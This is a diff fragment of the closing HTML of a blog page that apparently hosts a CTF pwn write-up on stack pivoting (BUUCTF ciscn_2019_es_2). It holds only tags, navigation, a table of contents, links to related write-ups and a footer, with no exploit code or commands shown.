+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#栈迁移</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >上一页</span
+        >
+        <a href="https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/" class="block">【首道堆题】【fastbin attack】【unsorted bin main_arena leak】babyheap_0ctf_2017</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="block">BUUCTF ciscn_2019_ne_5</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#栈迁移例题解析write-upbuuctf-ciscn_2019_es_2">【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2</a>
+      <ul>
+        <li><a href="#checksec查看程序架构">checksec查看程序架构</a></li>
+        <li><a href="#ida查看程序伪代码">ida查看程序伪代码</a></li>
+        <li><a href="#构建exp">构建exp</a>
+          <ul>
+            <li><a href="#栈迁移的基本思路">栈迁移的基本思路</a></li>
+            <li><a href="#泄露ebp">泄露ebp</a></li>
+            <li><a href="#开始栈迁移">开始栈迁移</a></li>
+            <li><a href="#完整exp">完整exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/" class="no-underline">【call32】【栈迁移】BUUCTF ciscn_2019_s_4</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">【32位系统传参】BUUCTF picoctf_2018_rop chain</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">【C&#43;&#43;Pwn】[ZJCTF 2019]Login</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">【C内嵌汇编】others_shellcode</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div>
+<link rel="stylesheet" href="../../css/copy-btn.css">
+<script src="../../js/copy-btn.js"></script></div>
+    </footer>
+  </body>
+</html>
